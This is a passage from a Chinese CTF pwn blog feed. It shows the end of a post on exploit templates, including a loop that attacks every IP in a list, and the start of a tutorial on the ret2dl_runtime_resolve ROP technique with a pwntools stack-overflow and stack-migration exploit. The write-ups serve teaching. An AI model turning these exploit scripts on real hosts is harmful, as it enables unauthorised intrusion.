class="line"><span class="string">        print(e)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_attack_all</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> threading</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> iplist:</span><br><span class="line">        threads.append(threading.Thread(target=exp, args=(ip,)))</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_attack_all</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> multiprocessing </span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> iplist:</span><br><span class="line">        pool.apply_async(exp, (ip, ))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> iplist:</span><br><span class="line">        exp(ip)</span><br></pre></td></tr></table></figure><p>具体语法可以理解为<br>%if args<br>content<br>%endif<br>content就是内容,args就是参数，通过这个方法进行模板的生成</p><h3 id="pwntools-exp模板生成方法"><a href="#pwntools-exp模板生成方法" class="headerlink" title="pwntools exp模板生成方法"></a>pwntools exp模板生成方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> absolute_import</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.commandline <span class="keyword">import</span> common</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mako.lookup <span class="keyword">import</span> TemplateLookup</span><br><span class="line"></span><br><span class="line">parser = common.parser_commands.add_parser(</span><br><span class="line">    <span class="string">'template'</span>,</span><br><span class="line">    help = <span class="string">'Generate an exploit template'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'exe'</span>, nargs=<span class="string">'?'</span>, help=<span class="string">'Target binary'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--host'</span>, help=<span class="string">'Remote host / SSH server'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--port'</span>, help=<span class="string">'Remote port / SSH port'</span>, type=int)</span><br><span class="line">parser.add_argument(<span class="string">'--libc'</span>, help=<span class="string">'Remote libc version'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--local'</span>, help=<span class="string">'local debug'</span>, action=<span class="string">'store_true'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(args)</span>:</span></span><br><span class="line">    cache = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cache:</span><br><span class="line">        cache = os.path.join(context.cache_dir, <span class="string">'mako'</span>)</span><br><span class="line"></span><br><span class="line">    lookup = TemplateLookup(</span><br><span class="line">        directories      = [os.path.join(pwnlib.data.path, <span class="string">'templates'</span>)],</span><br><span class="line">        module_directory = cache</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template = lookup.get_template(<span class="string">'pwnup.mako'</span>)</span><br><span class="line">    output = template.render(args.exe,</span><br><span class="line">                             args.host,</span><br><span class="line">                             args.port,</span><br><span class="line">                             args.libc,</span><br><span class="line">                             args.local,</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Fix Mako formatting bs</span></span><br><span class="line">    output = re.sub(<span class="string">'\n\n\n'</span>, <span class="string">'\n\n'</span>, output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.stdout.isatty():</span><br><span class="line">        <span class="keyword">try</span>: os.fchmod(sys.stdout.fileno(), <span class="number">0700</span>)</span><br><span class="line">        <span class="keyword">except</span> OSError: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pwnlib.commandline.common.main(__file__)</span><br></pre></td></tr></table></figure><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p>└──╼ $pwn template oreo –libc libc.so.6</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'oreo'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'oreo'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/9f664865/">https://noone-hub.github.io/posts/9f664865/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>二进制,pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>高级ROP ret2dl_runtime 之通杀详解</title>
    <url>/posts/a606db69/</url>
    <content><![CDATA[<h1 id="高级ROP-ret2dl-runtime-之通杀详解-本文首发于先知社区"><a href="#高级ROP-ret2dl-runtime-之通杀详解-本文首发于先知社区" class="headerlink" title="高级ROP ret2dl_runtime 之通杀详解(本文首发于先知社区)"></a>高级ROP ret2dl_runtime 之通杀详解(本文首发于先知社区)</h1><p>前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了</p><h2 id="ret2dllruntime-原理"><a href="#ret2dllruntime-原理" class="headerlink" title="ret2dllruntime 原理"></a>ret2dllruntime 原理</h2><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>先推荐几个地址学习下</p><ul><li><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop" alt="ctf-wiki之高级ROP"></p></li><li><p><img src="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure/" alt="ctf-wiki之elf文件基本结构"></p></li></ul><p>虽然以上不是我的博客，不过这些个大佬帮助了我，给个链接也是应该的。<br>ctf-wiki那个题目我感觉不够经典，还多了个write函数，单一难以泄露才是最经典的题目，所以我选了这个题目来做示例</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的栈溢出<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcugf5krj30ao0ej3ys.jpg" alt="1"><br>可没有多余的函数可以泄露，这对于我这千年通过leak进行rop的玩家很不友好，因为这道题我做过，虽然当时没做出也没研究，不过以前欠过的债迟早要还的，在国赛就在遇到了它，国赛的时候我找到了别人的exp，0ctf-2018的题目一把梭了。在赛后好好研究了一下这个题目，发觉这类题型就是改改exp就可以通杀，发觉很舒服做这种题。好了，话不多说，开始正文：<br>没有leak，如何做呢，ctf-wiki高级ROP了解一波</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>要想弄懂这个 ROP 利用技巧，需要首先理解 ELF 文件的基本结构，以及动态链接的基本过程，请参考 executable 中 elf 对应的介绍。这里我只给出相应的利用方式。</p><p>我们知道在 linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下</p><pre><code>控制程序执行 dl_resolve 函数
    给定 Link_map 以及 index 两个参数。
    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。
控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。
伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。
伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</code></pre><p>此外，这个攻击成功的很必要的条件</p><pre><code>dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。
dl_resolve 函数最后的解析根本上依赖于所给定的字符串。</code></pre><p>注意：</p><pre><code>符号版本信息
    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。
重定位表项
    r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</code></pre><p><strong>相信各位看官在看到这里的时候跟我一样懵，因为我也不了解具体原理当时，看着这段话不知道什么意思，所以我就先去了解elf的基本结构以及动态链接的基本过程（PS:我也没完整看完，枯燥乏味，通过调试一点点理解过程的)</strong><br>这里先说下动态延迟绑定机制：<br>就是一开始把所有的函数都链接实际是一种浪费，因此采用延迟绑定技术,核心是第一次用的时候进行绑定，没有用到不进行绑定，这样用来加快程序的运行速度<br>所以第一次调用的这个函数的时候，程序会去查表，然后利用_dl_runtime_resolve将正确的地址写入got.plt表里，下次查询的时候就直接跳到正确的地址处<br>先看下调试部分吧</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">► <span class="number">0x8048390</span>  &lt;read@plt&gt;                  jmp    dword ptr [read@got.plt] &lt;<span class="number">0x804a00c</span>&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x8048396</span>  &lt;read@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line">  <span class="number">0x804839b</span>  &lt;read@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x8048380</span></span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x8048380</span>                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+<span class="number">4</span>] &lt;<span class="number">0x804a004</span>&gt;</span><br><span class="line">  <span class="number">0x8048386</span>                              jmp    dword ptr [<span class="number">0x804a008</span>] &lt;<span class="number">0xf7fe96c0</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0xf7fe96c0</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">  <span class="number">0xf7fe96c1</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">  <span class="number">0xf7fe96c2</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   edx</span><br><span class="line">  <span class="number">0xf7fe96c3</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0xf7fe96c7</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">  <span class="number">0xf7fe96cb</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;<span class="number">0xf7fe3ac0</span>&gt;</span><br></pre></td></tr></table></figure><p>这是我在read@plt处下断，</p><ul><li>你看他第一次调用的时候，<span class="exturl" data-url="bWFpbHRvOnJlYWRAZ290LnBsdA==" title="mailto:read@got.plt">read@got.plt<i class="fa fa-external-link"></i></span>里存的是下一条指令的地址，也就是0x8048396，</li><li>然后将read函数在表里的偏移push进去，这里push的是0，</li><li>然后跳到plt0里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的<span class="exturl" data-url="bWFpbHRvOnJlYWRAZ290LnBsdA==" title="mailto:read@got.plt">read@got.plt<i class="fa fa-external-link"></i></span>表里，然后将程序的控制权交给解析出来的地址指向的函数</li></ul><p><strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong><br>这只是通俗易懂的说法，实际伪造这个表起来不是那么简单，除非你理解了整个过程<br>我将ctf-wiki上的内容摘抄过来了，帮助你们理解，他是进行了完整的解释，我感觉太长了，不过我理解过后看的话，看懂了。。。</p><h2 id="elf部分的关键点（来自ctf-wiki"><a href="#elf部分的关键点（来自ctf-wiki" class="headerlink" title="elf部分的关键点（来自ctf-wiki)"></a>elf部分的关键点（来自ctf-wiki)</h2><p>动态链接器和程序按照如下方式解析过程链接表和全局偏移表的符号引用。</p><ol><li>当第一次建立程序的内存镜像时，动态链接器将全局偏移表的第二个和第三个项设置为特殊的值，下面的步骤会仔细解释这些数值。</li><li>如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。每一个进程镜像中的共享目标文件都有独立的 PLT 表，并且程序只在同一个目标文件将控制流交给 PLT 表项。因此，调用函数负责在调用 PLT 表项之前，将全局偏移表的基地址设置为寄存器中。</li><li>这里举个例子，假设程序调用了 name1，它将控制权交给了 lable .PLT1。</li><li>那么，第一条指令将会跳转到全局偏移表中 name1 的地址。初始时，全局偏移表中包含 PLT 中下一条 pushl 指令的地址，并不是 name1 的实际地址。</li><li>因此，程序将一个重定向偏移（reloc_index）压到栈上。重定位偏移是 32 位的，并且是非负的数值。此外，重定位表项的类型为 R_386_JMP_SLOT，并且它将会说明在之前 jmp 指令中使用的全局偏移表项在 GOT 表中的偏移。重定位表项也包含了一个符号表索引，因此告诉动态链接器什么符号目前正在被引用。在这个例子中，就是 name1 了。</li><li>在压入重定位偏移后，程序会跳转到 .PLT0，这是过程链接表的第一个表项。pushl 指令将 GOT 表的第二个表项 (got_plus_4 或者 4(%ebx)，当前 ELF 对象的信息) 压到栈上，然后给动态链接器一个识别信息。此后，程序会跳转到第三个全局偏移表项 (got_plus_8 或者 8(%ebx)，指向动态装载器中_dl_runtime_resolve 函数的指针) 处，这将会将程序流交给动态链接器。</li><li>当动态链接器接收到控制权后，他将会进行出栈操作，查看重定位表项，找到对应的符号的值，将 name1 的地址存储在全局偏移表项中，然后将控制权交给目的地址。</li><li>过程链接表执行之后，程序的控制权将会直接交给 name1 函数，而且此后再也不会调用动态链接器来解析这个函数。也就是说，在 .PLT1 处的 jmp 指令将会直接跳转到 name1 处，而不是再次执行 pushl 指令。</li></ol><p>在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用</p><p>_dl_runtime_resolve(link_map_obj, reloc_index)</p><p>这里以 32 位为例（64 位类似），具体的过程如下</p><ul><li>根据 reloc_index 计算相应的重定位表项：Elf32_Rel *reloc = JMPREL + index</li><li>根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)&gt;&gt;8</li><li>继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)&gt;&gt;8)]</li><li>判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )</li><li>if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)<ul><li>if (sym-&gt;st_other) &amp; 3 == 0 )</li><li>判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。</li></ul></li><li>得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。</li><li><ul><li>uint16_t ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8]</li></ul></li><li><ul><li>r_found_version *version = &amp;l-&gt;l_version[ndx]</li></ul></li><li>根据 name 来寻找相应函数在库中的地址。<ul><li>name = STRTAB + sym-&gt;st_name</li></ul></li></ul><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>刚刚我说了攻击方式，接下来我们就要伪造偏移跟表了<br>简单来说，ret2dllruntime这个攻击方式他要利用三个表:</p><ol><li>.rel.plt</li><li>.dynsym</li><li>.dynstr</li></ol><ul><li>他先从.rel.plt表里找到某个函数在dynsym里的偏移</li><li>然后从.dynsym符号表里找寻该函数在.dynstr表里的偏移</li><li>在从.dynstr表里找到具体的函数对应的字符串，然后将这个字符串解析成函数<br>所以如果我们可以找到这个表，改掉这个表里的字符串，按理说也是可以进行调用成功的<br>贴张图，这是整体结构部分图</li></ul><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wctwfkbtj311q0luwlp.jpg" alt="2"></p><h3 id="第一个表是-rel-plt也就是ELF-REL-Relocation-Table"><a href="#第一个表是-rel-plt也就是ELF-REL-Relocation-Table" class="headerlink" title="第一个表是.rel.plt也就是ELF REL Relocation Table"></a>第一个表是.rel.plt也就是ELF REL Relocation Table</h3><p>这个表里有个结构体，存储了写入位置和具体偏移量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LOAD:0804831C ; ELF REL Relocation Table</span><br><span class="line">LOAD:0804831C                 Elf32_Rel &lt;8049FFCh, 306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048324                 Elf32_Rel &lt;804A040h, 705h&gt; ; R_386_COPY stderr</span><br><span class="line">LOAD:0804832C                 Elf32_Rel &lt;804A060h, 905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048334                 Elf32_Rel &lt;804A064h, 605h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:0804833C ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:0804833C                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT <span class="built_in">read</span></span><br><span class="line">LOAD:08048344                 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT alarm</span><br><span class="line">LOAD:0804834C                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048354                 Elf32_Rel &lt;804A018h, 507h&gt; ; R_386_JMP_SLOT setvbuf</span><br><span class="line">LOAD:08048354 LOAD            ends</span><br></pre></td></tr></table></figure><ul><li>前面是写入的位置，而107代表的是偏移为1的导入函数，07代表的是导入函数的意思，所以你在exp里会看到&lt;&lt;8位或者&gt;&gt;8位这种操作，就是去掉07或者增加07</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">           Elf32_Addr r_offset;</span><br><span class="line">           Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><ul><li>他实际是个结构体，每个都由r_offset和r_info组成，r_info存的也是偏移，是在dynsym表里的偏移,例如read，他在这里是107h就是偏移为1的导入函数，从ELF Symbol Table里找</li></ul><h3 id="第二个表是-dynsym也就是ELF-Symbol-Table"><a href="#第二个表是-dynsym也就是ELF-Symbol-Table" class="headerlink" title="第二个表是.dynsym也就是ELF Symbol Table"></a>第二个表是.dynsym也就是ELF Symbol Table</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:080481DC ; ELF Symbol Table</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aRead - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aAlarm - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;alarm&quot;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aGmonStart - offset byte_804827C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804827C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804821C                            0&gt;</span><br><span class="line">LOAD:0804822C                 Elf32_Sym &lt;offset aSetvbuf - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;setvbuf&quot;</span><br><span class="line">LOAD:0804823C                 Elf32_Sym &lt;offset aStdout - offset byte_804827C, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:0804823C                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804824C                 Elf32_Sym &lt;offset aStderr - offset byte_804827C, \ ; &quot;stderr&quot;</span><br><span class="line">LOAD:0804824C                            offset stderr@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804825C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804827C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804825C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:0804826C                 Elf32_Sym &lt;offset aStdin - offset byte_804827C, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:0804826C                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure><p>在这个表里查到也就是第一个函数，没毛病，其实这个表每个项也是一个结构体</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure><p>我们所以要伪造的还有st_name，让他去我们的.dynstr表里查找，查找到我们需要的</p><h3 id="第三个表就是-dynstr了，也就是ELF-String-Table"><a href="#第三个表就是-dynstr了，也就是ELF-String-Table" class="headerlink" title="第三个表就是.dynstr了，也就是ELF String Table"></a>第三个表就是.dynstr了，也就是ELF String Table</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:0804827C ; ELF String Table</span><br><span class="line">LOAD:0804827C byte_804827C    db 0                    ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804827C                                         ; LOAD:080481FC↑o ...</span><br><span class="line">LOAD:0804827D aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048287 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:0804825C↑o</span><br><span class="line">LOAD:08048296 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:0804826C↑o</span><br><span class="line">LOAD:0804829C aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:080482A1 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:0804823C↑o</span><br><span class="line">LOAD:080482A8 aStderr         db &apos;stderr&apos;,0           ; DATA XREF: LOAD:0804824C↑o</span><br><span class="line">LOAD:080482AF aAlarm          db &apos;alarm&apos;,0            ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:080482B5 aSetvbuf        db &apos;setvbuf&apos;,0          ; DATA XREF: LOAD:0804822C↑o</span><br><span class="line">LOAD:080482BD aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482BD                                         ; DATA XREF: LOAD:0804821C↑o</span><br><span class="line">LOAD:080482CF aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:080482DE aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:080482E8                 dd 20000h, 2, 2 dup(20002h), 20001h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:0804830C                 dd 0D696910h, 20000h, 62h, 0</span><br></pre></td></tr></table></figure><p>这个没啥好解释的就是一串字符串，找到这个后，_dl_lookup就会拿这个字符串去查找对应的函数，然后将函数地址取回来写入got.plt表，最后将程序控制权交给该函数<br><strong>注意：这里的都是相对偏移地址，没有绝对地址，切记切记，不然等会构造exp的时候你会一脸懵逼的</strong></p><h2 id="exp详解"><a href="#exp详解" class="headerlink" title="exp详解"></a>exp详解</h2><p>我将exp分段进行讲述吧，从exp里调试或许能更清晰的解释这个过程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">io = process(<span class="string">'./pwn'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">'a'</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(rop.chain())</span><br></pre></td></tr></table></figure><p>这段只是进行栈的迁移，这个部分的知识自行到ctf-wiki补充，或者找些题目练下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br></pre></td></tr></table></figure><p><strong>这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析</strong><br>我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section header部分，他表里有个字段叫sh_addr</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    ELF32_Word      sh_name;</span><br><span class="line">    ELF32_Word      sh_type;</span><br><span class="line">    ELF32_Word      sh_flags;</span><br><span class="line">    ELF32_Addr      sh_addr;</span><br><span class="line">    ELF32_Off       sh_offset;</span><br><span class="line">    ELF32_Word      sh_size;</span><br><span class="line">    ELF32_Word      sh_link;</span><br><span class="line">    ELF32_Word      sh_info;</span><br><span class="line">    ELF32_Word      sh_addralign;</span><br><span class="line">    ELF32_Word      sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>成员 | 说明<br>-|-|-<br>sh_name |节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 